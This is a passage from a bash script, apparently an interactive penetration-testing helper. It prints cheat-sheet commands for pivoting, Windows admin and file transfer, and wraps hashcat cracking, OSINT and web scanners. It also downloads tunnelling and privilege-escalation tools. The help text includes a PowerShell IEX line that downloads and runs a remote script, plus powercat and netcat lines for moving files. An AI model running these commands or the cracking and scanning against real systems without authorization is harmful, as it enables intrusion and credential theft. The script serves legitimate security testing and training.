                echo -e "${YELLOW}mkdir: Create a new directory${NC}"
                echo "example: mkdir new_directory"
                echo
                echo -e "${YELLOW}rmdir: Delete a directory${NC}"
                echo "example: rmdir empty_directory"
                echo
                echo -e "${YELLOW}type: Show the content of a file${NC}"
                echo "example: type file.txt"
                echo
                echo -e "${YELLOW}notepad: Open Notepad${NC}"
                echo "example: notepad file.txt"
                echo
                echo -e "${YELLOW}attrib: Show or change file attributes${NC}"
                echo "example: attrib +r file.txt"
                echo
                echo -e "${YELLOW}icacls: Display or change access control lists (ACLs) for files and directories${NC}"
                echo "example: icacls file.txt /grant User:F"
                echo
                echo -e "${YELLOW}findstr: Search text within files${NC}"
                echo "example: findstr 'search_term' file.txt"
                echo
                echo -e "${YELLOW}tasklist: Shows a list of running processes${NC}"
                echo "example: tasklist"
                echo
                echo -e "${YELLOW}taskkill: Terminate one or more processes${NC}"
                echo "example: taskkill /PID 1234 /F"
                echo
                echo -e "${YELLOW}powershell: Start a Windows PowerShell session${NC}"
                echo "example: powershell"
                echo
                echo -e "${YELLOW}schtasks: Schedule commands and programs to run on a computer${NC}"
                echo "example: schtasks /create /sc daily /tn Backup /tr C:\backup.bat /st 23:00"
                echo
                echo -e "${YELLOW}netstat: Shows network connections, routing tables, and interface statistics${NC}"
                echo "example: netstat -an"
                echo
                echo -e "${YELLOW}ipconfig: Shows the computer's network settings${NC}"
                echo "example: ipconfig /all"
                echo
                echo -e "${YELLOW}reg: Check or change the Windows Registry${NC}"
                echo "example: reg query HKLM\Software"
                echo
                echo -e "${YELLOW}sc: Control Windows services${NC}"
                echo "example: sc stop ServiceName"
                echo
                echo -e "${YELLOW}wmic: Windows Management Instrumentation interface${NC}"
                echo "example: wmic process list"
                echo
                ;;
            3)
		            clear
                echo -e "${GREEN}Pivoting:${NC}"
                echo -e "${YELLOW}Chisel Server:${NC}"
                echo "We have to have chisel decompressed: gunzip chisel_1.X.X_linux_arm64.gz"
                echo "Give execution permissions: chmod +x chisel"
                echo -e "${BLUE}example para ponernos a escucha en el puerto 33: ./chisel server --reverse -p 33${NC}"
                echo "Now on the client computer we will have to have chisel and use it in client mode"
                echo -e "${BLUE}example to get into client mode tunneling all ports: ./chisel client ${VIOLET}SERVER-IP${BLUE}:${VIOLET}1234${BLUE} R:socks"
                echo -e "${BLUE}example to get into client mode tunneling 1 port: ./chisel client ${VIOLET}SERVER-IP${BLUE}:1234 R:80:${VIOLET}LOCAL-IP${BLUE}:80"
                echo -e "${RED}       *If we run the client on Windows we will have to use chisel.exe (followed by the command)${NC}"
                echo
                echo -e "${YELLOW}Socat:${NC}"
                echo -e "${BLUE}Run socat on the intermediate machine: ./socat tcp-l:1080,fork,reuseaddr tcp:${VIOLET}TARGET-IP${BLUE}:111"
                echo "This means that all the traffic that the intermediate machine receives through port 1080 will be forwarded to our Kali machine through port 111."
                echo -e "${RED}       *If we run it on Windows we will have to use socat.exe (followed by the command)${NC}"
                echo
                echo -e "${YELLOW}Netsh:${NC}"
                echo -e "${BLUE}example: netsh interface portproxy add v4tov4 listenport=${VIOLET}LOCAL-PORT${BLUE} listenaddress=${VIOLET}LOCAL-IP${BLUE} connectport=${VIOLET}REMOTE-PORT${BLUE} connectaddress=${VIOLET}TARGET-IP${NC}"
                echo
                ;;
            4)
		            clear
                echo -e "${GREEN}File transfer:${NC}"
						    echo -e "${YELLOW}Linux:${NC}"
    				    echo -e "${YELLOW}curl:${NC}"
    				    echo "example: curl -O http://example.com/file"
    				    echo
    				    echo -e "${YELLOW}wget:${NC}"
    				    echo "example: wget http://example.com/file"
    				    echo
    				    echo -e "${YELLOW}socat:${NC}"
    				    echo "example: socat TCP-LISTEN:1234,fork file:file_to_send"
    				    echo
    				    echo -e "${YELLOW}netcat:${NC}"
    				    echo "example: nc -l -p 1234 > file_received"
    				    echo
    				    echo -e "${YELLOW}scp:${NC}"
    				    echo "example: scp file_to_send user@remote_host:/path/to/destination"
    				    echo
    				    echo -e "${YELLOW}rsync:${NC}"
    				    echo "example: rsync -avz file_to_send user@remote_host:/path/to/destination"
    				    echo
    				    echo -e "${YELLOW}Windows:${NC}"
    				    echo -e "${YELLOW}PowerShell (Download a file):${NC}"
    				    echo "example: powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://example.com/file','C:\\path\\to\\save\\file')\""
    				    echo
    				    echo -e "${YELLOW}certutil:${NC}"
    				    echo "example: certutil.exe -urlcache -f http://example.com/file C:\\path\\to\\save\\file"
    				    echo
    				    echo -e "${YELLOW}socat:${NC}"
    				    echo "example: socat TCP4:remote_host:1234 file:file_received,create"
    				    echo
    				    echo -e "${YELLOW}netcat:${NC}"
    				    echo "example: nc.exe -nlvp 4444 > incoming.exe"
    				    echo
    				    echo -e "${YELLOW}PowerShell (Remote script execution):${NC}"
    				    echo "example: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
    				    echo
    				    echo -e "${YELLOW}FTP:${NC}"
    				    echo "example: ftp -s:script.txt"
    				    echo "Nota: 'script.txt' contiene comandos FTP como 'open', 'user', 'get', etc."
    				    echo
    				    echo -e "${YELLOW}Powercat:${NC}"
   				      echo "example: powercat -c remote_host -p 443 -i C:\\path\\to\\file"
    				    echo
    				    echo -e "${YELLOW}Download wget with PowerShell:${NC}"
    				    echo "example: powershell -command \"Invoke-WebRequest -Uri 'https://eternallybored.org/misc/wget/current/wget.exe' -OutFile 'C:\\path\\to\\save\\wget.exe'\""
    				    echo
    				    ;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to detect hash type
detect_hash_type() {
    hash=$1
    hash_length=${#hash}
    hashid_output=$(hashid "$hash")

    if [[ "$hash_length" -eq 32 && "$hash" =~ ^[A-F0-9]{32}$ ]]; then
        hash_type="NTLM"
    else
        case $hash_length in
            32)
                hash_type="MD5"
                ;;
            16)
                hash_type="CRC16"
                ;;
            8)
                hash_type="Adler32"
                ;;
            40)
                hash_type="SHA1"
                ;;
            64)
                hash_type="SHA256"
                ;;
            128)
                hash_type="SHA512"
                ;;
            48)
                hash_type="SHA224"
                ;;
            96)
                hash_type="SHA384"
                ;;
            *)
                hash_type=$(echo "$hashid_output" | grep -Eo 'MD2|MD4|MD5|SHA1|SHA224|SHA256|SHA384|SHA512|CRC16|Adler32' | head -n 1)
                ;;
        esac
    fi

    echo -e "${GREEN}[+] Detected hash type: ${hash_type}${NC}"
    echo $hash_type
}

# Function to check and update the log file
check_and_update_log() {
    log_file="${BASE_DIR}/hashes_cracked.log"
    hash=$1
    password=$2

    if [ ! -f "$log_file" ]; then
        touch "$log_file"
    fi

    if [ -n "$password" ]; then
        echo "$hash:$password" >> "$log_file"
    fi

    grep "^$hash:" "$log_file" | awk -F':' '{print $3}'
}

# Function to crack a hash using Hashcat
crack_with_hashcat() {
    show_info_panel
    last_output=""
    read -e -p "Enter the hash: " hash
    hash_type=$(detect_hash_type "$hash")
    if [ $? -ne 0 ]; then
        return 1
    fi

    # Check if the hash is already cracked
    existing_password=$(check_and_update_log "$hash")
    if [ -n "$existing_password" ]; then
        clear
        echo -e "${GREEN}[+] Hash already cracked:${NC}"
        echo -e "${GREEN}Hash: ${hash}${NC}"
        echo -e "${GREEN}Password: ${existing_password}${NC}"
        return 0
    fi

    echo -e "${BLUE}[+] Do you want to use the default dictionary (/usr/share/wordlists/rockyou.txt)? (y/n):${NC}"
    read -e -p "Option: " dict_option2
    if [ "$dict_option2" == "n" ]; then
        echo -e "${BLUE}[+] Enter the dictionary path:${NC}"
        read -e -p "Dictionary: " custom_dict2
        dict_option2="$custom_dict2"
    else
        dict_option2="/usr/share/wordlists/rockyou.txt"
    fi
    read -e -p "Enter the file name to save the results: " output_file

    declare -A hash_modes=(
        ["NTLM"]="1000"
        ["MD2"]="10"
        ["MD4"]="900"
        ["MD5"]="0"
        ["MD6-128"]="3710"
        ["MD6-256"]="7200"
        ["MD6-512"]="9000"
        ["RipeMD-128"]="6000"
        ["RipeMD-160"]="20000"
        ["RipeMD-256"]="10000"
        ["RipeMD-320"]="20000"
        ["SHA1"]="100"
        ["SHA3-224"]="17300"
        ["SHA3-256"]="17400"
        ["SHA3-384"]="17500"
        ["SHA3-512"]="17600"
        ["SHA-224"]="1300"
        ["SHA-256"]="1400"
        ["SHA-384"]="10800"
        ["SHA-512"]="1700"
        ["CRC16"]="11500"
        ["CRC32"]="11500"
        ["Adler32"]="2000"
        ["Whirlpool"]="6100"
    )
    hash_detected=false

    for hash_name in "${!hash_modes[@]}"; do
        mode=${hash_modes[$hash_name]}
        clear
        echo -e "${VIOLET}\n\n\n=========================================================================="
        echo -e "================== ${YELLOW}Testing mode Hashcat: $hash_name (${mode}) ${VIOLET}=================="
        echo -e "==========================================================================${NC}"
        echo "$hash" > hash.txt
        hashcat -m $mode -a 0 hash.txt $dict_option2 -o "$BASE_DIR/loot/$output_file"
        result=$(cat "$BASE_DIR/loot/$output_file")
        if [[ -n "$result" ]]; then
            hash_detected=true
            echo -e "${GREEN}>>>>>>>>>>>>>>>>>>>>>>>>>>>> ${RED}PASSWORD ${GREEN}<<<<<<<<<<<<<<<<<<<<<<<<<<<${NC}"
            echo -e "${YELLOW}[+] Decrypted hash: ${result}${NC}"
            mv "$BASE_DIR/loot/$output_file" "$BASE_DIR/loot/cracked_$output_file.txt"
            check_and_update_log "$hash" "$result"
            echo -e "${GREEN}>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ${RED}o ${GREEN}<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<${NC}"
            break
        fi
    done

    if ! $hash_detected; then
        echo -e "${RED}[-] Could not decrypt hash with tested types.${NC}"
    fi
}

# Function to select and execute hash cracking tool
hash_crack_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Hash Crack Option:${NC}"
        echo -e "1) Detect hash type"
        echo -e "2) Decrypt hash with Hashcat"
        echo -e "3) Back to Main Menu"
        read -e -p "Option: " hash_crack_option

        case $hash_crack_option in
            1)
                detect_hash_type
                ;;
            2)
                crack_with_hashcat
                ;;
            3)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function for OSINT Tools submenu
osint_tools_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an OSINT Tool Option:${NC}"
        echo -e "1) theHarvester"
        echo -e "2) Spiderfoot"
        echo -e "3) FinalRecon scan"
        echo -e "4) Nuclei scan"
        echo -e "5) Back to Main Menu"
        read -e -p "Option: " osint_tools_option

        clear
        case $osint_tools_option in
            1)
                osint_theharvester
                ;;
            2)
                osint_spiderfoot
                ;;
            3)
                osint_finalrecon
                ;;
            4)
                osint_nuclei
                ;;
            5)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to perform OSINT with theHarvester
osint_theharvester() {
    show_info_panel
    read -e -p "Enter the target domain: " domain
    echo ""
    echo -e "${YELLOW}Available sources:${NC} anubis, baidu, bevigil, binaryedge, bing, bingapi, bufferoverun, brave, censys, certspotter, criminalip, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, hackertarget, hunter, hunterhow, intelx, netlas, onyphe, otx, pentesttools, projectdiscovery, rapiddns, rocketreach, securityTrails, sitedossier, subdomaincenter, subdomainfinderc99, threatminer, tomba, urlscan, virustotal, yahoo, zoomeye${NC}: " source
    echo ""
    read -e -p "Enter the source (comma-separated for multiple): " source
    clear
    echo -e "${GREEN}[+] Running theHarvester against $domain with source $source${NC}"
    theHarvester -d $domain -b $source -f "$BASE_DIR/osint/theharvester_${source}_${hora}.html"
    echo -e "${GREEN}[+] theHarvester report saved in ${BASE_DIR}/osint/theharvester_${source}_${hora}.html${NC}"
}

# Function to perform OSINT with Spiderfoot
osint_spiderfoot() {
    show_info_panel
    read -e -p "Enter the target domain: " domain
    echo -e "${BLUE}[+] Select a Spiderfoot module to run:${NC}"
    echo -e "1) sfp_abstractapi            - Look up domain, phone and IP address information from AbstractAPI."
    echo -e "2) sfp_abusech                - Check if a host/domain, IP address or netblock is malicious according to Abuse.ch."
    echo -e "3) sfp_abuseipdb              - Check if an IP address is malicious according to AbuseIPDB.com blacklist."
    echo -e "4) sfp_accounts               - Look for possible associated accounts on nearly 200 websites."
    echo -e "5) sfp_adblock                - Check if linked pages would be blocked by AdBlock Plus."
    echo -e "6) sfp_adguard_dns            - Check if a host would be blocked by AdGuard DNS."
    echo -e "7) sfp_ahmia                  - Search Tor 'Ahmia' search engine for mentions of the target."
    echo -e "8) sfp_alienvault             - Obtain information from AlienVault Open Threat Exchange (OTX)."
    echo -e "9) sfp_alienvaultiprep        - Check if an IP or netblock is malicious according to the AlienVault IP Reputation database."
    echo -e "10) sfp_archiveorg            - Identifies historic versions of interesting files/pages from the Wayback Machine."
    echo -e "11) sfp_arin                  - Queries ARIN registry for contact information."
    echo -e "12) sfp_bgpview               - Obtain network information from BGPView API."
    echo -e "13) sfp_binaryedge            - Obtain information from BinaryEdge.io Internet scanning systems."
    echo -e "14) sfp_bingsearch            - Obtain information from Bing to identify sub-domains and links."
    echo -e "15) sfp_bitcoin               - Identify bitcoin addresses in scraped webpages."
    echo -e "16) sfp_bitcoinabuse          - Check Bitcoin addresses against the bitcoinabuse.com database of suspect/malicious addresses."
    echo -e "17) sfp_blockchain            - Queries blockchain.info to find the balance of identified bitcoin wallet addresses."
    echo -e "18) sfp_builtwith             - Query BuiltWith.com's Domain API for web technology stack information."
    echo -e "19) sfp_censys                - Obtain host information from Censys.io."
    echo -e "20) sfp_certspotter           - Gather information about SSL certificates from SSLMate CertSpotter API."
    echo -e "21) sfp_crt                   - Gather hostnames from historical certificates in crt.sh."
    echo -e "22) sfp_dnsdumpster           - Passive subdomain enumeration using HackerTarget's DNSDumpster."
    echo -e "23) sfp_dnsgrep               - Obtain Passive DNS information from Rapid7 Sonar Project using DNSGrep API."
    echo -e "24) sfp_dnsresolve            - Resolves hosts and IP addresses identified, also extracted from raw content."
    echo -e "25) sfp_dronebl               - Query the DroneBL database for open relays, open proxies, vulnerable servers, etc."
    echo -e "26) sfp_duckduckgo            - Query DuckDuckGo's API for descriptive information about your target."
    echo -e "27) sfp_email                 - Identify e-mail addresses in any obtained data."
    echo -e "28) sfp_haveibeenpwned        - Check HaveIBeenPwned.com for hacked e-mail addresses identified in breaches."
    echo -e "29) sfp_hunter                - Check for e-mail addresses and names on hunter.io."
    echo -e "30) sfp_virustotal            - Obtain information from VirusTotal about identified IP addresses."
    echo -e "31) Enter other module manually"

    read -p "Option: " spiderfoot_option
    clear
    case $spiderfoot_option in
        1) module="sfp_abstractapi" ;;
        2) module="sfp_abusech" ;;
        3) module="sfp_abuseipdb" ;;
        4) module="sfp_accounts" ;;
        5) module="sfp_adblock" ;;
        6) module="sfp_adguard_dns" ;;
        7) module="sfp_ahmia" ;;
        8) module="sfp_alienvault" ;;
        9) module="sfp_alienvaultiprep" ;;
        10) module="sfp_archiveorg" ;;
        11) module="sfp_arin" ;;
        12) module="sfp_bgpview" ;;
        13) module="sfp_binaryedge" ;;
        14) module="sfp_bingsearch" ;;
        15) module="sfp_bitcoin" ;;
        16) module="sfp_bitcoinabuse" ;;
        17) module="sfp_blockchain" ;;
        18) module="sfp_builtwith" ;;
        19) module="sfp_censys" ;;
        20) module="sfp_certspotter" ;;
        21) module="sfp_crt" ;;
        22) module="sfp_dnsdumpster" ;;
        23) module="sfp_dnsgrep" ;;
        24) module="sfp_dnsresolve" ;;
        25) module="sfp_dronebl" ;;
        26) module="sfp_duckduckgo" ;;
        27) module="sfp_email" ;;
        28) module="sfp_haveibeenpwned" ;;
        29) module="sfp_hunter" ;;
        30) module="sfp_virustotal" ;;
        31)
            read -e -p "Enter other module name: " module
            ;;
        *)
            echo -e "${RED}[-] Invalid option.${NC}"
            return 1
            ;;
    esac

    echo -e "${BLUE}[+] Running Spiderfoot module ${module} on ${domain}${NC}"
    spiderfoot -s $domain -m $module -F html > "$BASE_DIR/osint/spiderfoot_${hora}.html"
    last_output=$(cat "$BASE_DIR/osint/spiderfoot_${hora}.html")
    cat "$BASE_DIR/osint/spiderfoot_${hora}.html"
    echo -e "${GREEN}[+] Spiderfoot report saved in ${BASE_DIR}/osint/spiderfoot_${hora}.html${NC}"
}

# Function to perform OSINT with FinalRecon
osint_finalrecon() {
show_info_panel
    read -e -p "Enter the target domain or IP: " target
    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        read -e -p "Is the IP using HTTPS? (y/n): " is_https
        if [ "$is_https" == "y" ]; then
            target="https://$target"
        else
            target="http://$target"
        fi
    fi

    echo -e "${BLUE}[+] Select a scan type:${NC}"
    echo -e "1) Full Recon - Complete information gathering"
    echo -e "2) Headers - Header Information"
    echo -e "3) SSL Info - SSL Certificate Information"
    echo -e "4) Whois - Whois Lookup"
    echo -e "5) Crawl - Crawl Target"
    echo -e "6) DNS - DNS Enumeration"
    echo -e "7) Sub-Domain - Sub-Domain Enumeration"
    echo -e "8) Directory - Directory Search"
    echo -e "9) Wayback - Wayback URLs"
    echo -e "10) Port Scan - Fast Port Scan"
    read -e -p "Option: " scan_option
    clear

    case $scan_option in
        1) scan_type="full" ;;
        2) scan_type="headers" ;;
        3) scan_type="sslinfo" ;;
        4) scan_type="whois" ;;
        5) scan_type="crawl" ;;
        6) scan_type="dns" ;;
        7) scan_type="sub" ;;
        8) scan_type="dir" ;;
        9) scan_type="wayback" ;;
        10) scan_type="ps" ;;
        *) echo -e "${RED}[-] Invalid option.${NC}"; return ;;
    esac

    hora=$(date +"%m-%d-%H:%M")
    output_file="$BASE_DIR/enum/finalrecon_${scan_type}_$hora.txt"
    
    echo -e "${VIOLET}\n\n\n==================================================================="
    echo -e "================== ${YELLOW}FinalRecon Scan Type: $scan_type ${VIOLET}=================="
    echo -e "===================================================================${NC}"
    
    finalrecon --$scan_type $target > "$output_file"
    
    last_output=$(cat "$output_file")
    cat "$output_file"
    echo -e "${GREEN}[+] FinalRecon report saved in $output_file${NC}"
}

# Function for Web Tools submenu
web_tools_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select a Web Tools Option:${NC}"
        echo -e "1) WhatWeb scan"
        echo -e "2) Nikto scan"
        echo -e "3) Gobuster Scan"
        echo -e "4) Back to Main Menu"
        read -e -p "Option: " web_tools_option

        clear
        case $web_tools_option in
            1)
                show_info_panel
                if [ -z "$IP" ]; then
                    echo -e "${RED}[-] No IP configured.${NC}"
                else
                    read -e -p "Enter the port to scan with WhatWeb: " whatweb_port
                    read -e -p "Is it an HTTPS port? (y/n): " is_https
                    clear
                    if [ "$is_https" == "y" ]; then
                        echo -e "${GREEN}[+] Performing whatweb scan on https://${IP}:${whatweb_port}${NC}"
                        whatweb https://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
                    else
                        echo -e "${GREEN}[+] Performing whatweb scan on http://${IP}:${whatweb_port}${NC}"
                        whatweb http://${IP}:${whatweb_port} > "$ENUM_DIR/whatweb_$whatweb_port.txt"
                    fi
                    last_output=$(cat "$ENUM_DIR/whatweb_$whatweb_port.txt")
                    echo -e "${GREEN}[+] WhatWeb Report saved in ${ENUM_DIR}/whatweb_${whatweb_port}.txt${NC}"
                    cat "$ENUM_DIR/whatweb_$whatweb_port.txt"
                fi
                ;;
            2)
                show_info_panel
                if [ -z "$IP" ]; then
                    echo -e "${RED}[-] No IP configured.${NC}"
                else
                    read -e -p "Enter the port to scan with Nikto: " nikto_port
                    clear
                    echo -e "${GREEN}[+] Performing Nikto scan on ${IP}:${nikto_port}${NC}"
                    nikto -h $IP:$nikto_port | tee "$ENUM_DIR/nikto_$nikto_port.txt"
                    last_output=$(cat "$ENUM_DIR/nikto_$nikto_port.txt")
                    echo -e "${GREEN}[+] Nikto Report saved in ${ENUM_DIR}/nikto_${nikto_port}.txt${NC}"
                fi
                ;;
            3)
                show_info_panel
                if [ -z "$IP" ]; then
                    echo -e "${RED}[-] No IP configured.${NC}"
                else
                    read -e -p "Enter the URL/IP to scan with Gobuster: " gobuster_target
                    echo -e "${BLUE}[+] ¿Do you want to fuzz with file extensions? (y/n):${NC}"
                    read -e -p "Option: " fuzz_option
                    if [ "$fuzz_option" == "y" ]; then
                        echo -e "${BLUE}[+] Enter the extensions separated by commas (example: php,html,txt):${NC}"
                        read -e -p "Extensions: " extensions
                        ext_option="-x $extensions"
                    else
                        ext_option=""
                    fi
                    echo -e "${BLUE}[+] ¿Do you want to use the default dictionary (/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt)? (y/n):${NC}"
                    read -e -p "Option: " dict_option
                    if [ "$dict_option" == "n" ]; then
                        echo -e "${BLUE}[+] Enter the path to the custom dictionary:${NC}"
                        read -e -p "Dictionary: " custom_dict
                        dict_option="-w $custom_dict"
                    else
                        dict_option="-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
                    fi
                    clear
                    echo -e "${GREEN}[+] Performing Gobuster scan on ${gobuster_target}${NC}"
                    gobuster dir -u $gobuster_target $dict_option $ext_option -o "$ENUM_DIR/gobuster.txt"
                    last_output=$(cat "$ENUM_DIR/gobuster.txt")
                    echo -e "${GREEN}[+] Gobuster Report saved in ${ENUM_DIR}/gobuster.txt${NC}"
                fi
                ;;
            4)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to download tools
download_tools() {
    show_info_panel
    echo -e "${BLUE}Select the tool to download:${NC}"
    echo -e "1) Socat"
    echo -e "2) Chisel"
    echo -e "3) Ligolo"
    echo -e "4) WinPEAS"
    echo -e "5) LinPEAS"
    echo -e "6) Back to Main Menu"
    read -p "Enter your choice: " tool_choice
    clear

    case $tool_choice in
        1)
            echo -e "${BLUE}Select Socat version to download:${NC}"
            echo -e "1) Linux latest"
            echo -e "2) Windows V1.7.3"
            echo -e "3) Back to Main Menu"
            read -p "Enter your choice: " socat_version
            case $socat_version in
                1) 
                    wget -P "$BASE_DIR/tools" "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
                    clear
                    echo -e "${GREEN}[+] Socat (Linux - Latest) downloaded and saved as $BASE_DIR/tools/socat${NC}"
                    ;;
                2) 
                    wget -P "$BASE_DIR/tools" "https://github.com/tech128/socat-1.7.3.0-windows/archive/refs/heads/master.zip"
                    clear
                    echo -e "${GREEN}[+] Socat (Windows - V1.7.3) downloaded and saved as $BASE_DIR/tools/master.zip${NC}"
                    ;;
                3)
                    clear
                    return
                    ;;
                *)
                    echo -e "${RED}[-] Invalid option.${NC}"
                    ;;
            esac
            ;;
        2)
            echo -e "${BLUE}Select Chisel version to download:${NC}"
            echo -e "1) Linux V1.9.1"
            echo -e "2) Linux V1.7.3"
            echo -e "3) Windows V1.9.1"
            echo -e "4) Windows V1.7.3"
            echo -e "5) Back to Main Menu"
            read -p "Enter your choice: " chisel_version
            case $chisel_version in
                1) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Linux - V1.9.1) downloaded and saved as $BASE_DIR/tools/chisel_1.9.1_linux_amd64.gz${NC}"
                    ;;
                2) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Linux - V1.7.3) downloaded and saved as $BASE_DIR/tools/chisel_1.7.3_linux_amd64.gz${NC}"
                    ;;
                3) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Windows - V1.9.1) downloaded and saved as $BASE_DIR/tools/chisel_1.9.1_windows_386.gz${NC}"
                    ;;
                4) 
                    wget -P "$BASE_DIR/tools" "https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_386.gz"
                    clear
                    echo -e "${GREEN}[+] Chisel (Windows - V1.7.3) downloaded and saved as $BASE_DIR/tools/chisel_1.7.3_windows_386.gz${NC}"
                    ;;
                5)
                    clear
                    return
                    ;;
                *) 
                    echo "Invalid option"
                    ;;
            esac
            ;;
        3)
            echo -e "${BLUE}Select Ligolo version to download:${NC}"
            echo -e "1) Client"
            echo -e "2) Server"
            echo -e "3) Back to Main Menu"
            read -p "Enter your choice: " ligolo_choice
            case $ligolo_choice in
                1)
                    echo -e "${BLUE}Select Ligolo Client version to download:${NC}"
                    echo -e "1) Ligolo Proxy V0.6.1 Linux"
                    echo -e "2) Ligolo Proxy V0.5.2 Linux"
                    echo -e "3) Ligolo Proxy V0.6.1 Windows"
                    echo -e "4) Ligolo Proxy V0.5.2 Windows"
                    echo -e "5) Back to Main Menu"
                    read -p "Enter your choice: " ligolo_client_version
                    case $ligolo_client_version in
                        1) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Proxy - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz${NC}"
                            ;;
                        2) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Proxy - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz${NC}"
                            ;;
                        3) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Proxy - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.6.1_windows_amd64.zip${NC}"
                            ;;
                        4) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Proxy - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.5.2_windows_amd64.zip${NC}"
                            ;;
                        5)
                            clear
                            return
                            ;;
                        *) 
                            echo "Invalid option"
                            ;;
                    esac
                    ;;
                2)
                    echo -e "${BLUE}Select Ligolo Server version to download:${NC}"
                    echo -e "1) Ligolo Agent V0.6.1 Linux"
                    echo -e "2) Ligolo Agent V0.5.2 Linux"
                    echo -e "3) Ligolo Agent V0.6.1 Windows"
                    echo -e "4) Ligolo Agent V0.5.2 Windows"
                    echo -e "5) Back to Main Menu"
                    read -p "Enter your choice: " ligolo_server_version
                    case $ligolo_server_version in
                        1) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Agent - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz${NC}"
                            ;;
                        2) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Agent - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz${NC}"
                            ;;
                        3) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Agent - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.6.1_windows_amd64.zip${NC}"
                            ;;
                        4) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Agent - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.5.2_windows_amd64.zip${NC}"
                            ;;
                        5)
                            clear
                            return
                            ;;
                        *) 
                            echo "Invalid option"
                            ;;
                    esac
                    ;;
                3)
                    clear
                    return
                    ;;
                *) echo "Invalid option" ;;
            esac
            ;;
        4)
            wget -P "$BASE_DIR/tools" "https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe"
            clear
            echo -e "${GREEN}[+] WinPEAS downloaded and saved as $BASE_DIR/tools/winPEASx64.exe${NC}"
            ;;
        5)
            wget -P "$BASE_DIR/tools" "https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/linpeas_linux_amd64"
            clear
            echo -e "${GREEN}[+] LinPEAS downloaded and saved as $BASE_DIR/tools/linpeas_linux_amd64${NC}"
            ;;
        6)
            clear
            return
            ;;
        *)
            echo -e "${RED}[-] Invalid option.${NC}"
            ;;
    esac
}


# Function for Exploit Tools submenu
exploit_tools_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an Exploit Tools Option:${NC}"
        echo -e "1) Generate payloads"
        echo -e "2) Searchsploit"
        echo -e "3) Back to Main Menu"
        read -e -p "Option: " exploit_tools_option

        clear
        case $exploit_tools_option in
            1)
